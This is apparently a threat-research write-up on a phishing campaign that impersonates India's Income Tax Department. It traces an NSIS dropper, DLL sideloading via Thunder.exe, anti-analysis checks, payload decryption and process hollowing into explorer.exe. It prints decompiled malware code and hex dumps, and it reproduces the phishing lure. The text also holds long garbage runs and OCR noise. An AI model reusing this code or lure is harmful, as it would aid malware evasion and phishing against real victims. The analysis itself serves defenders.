6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 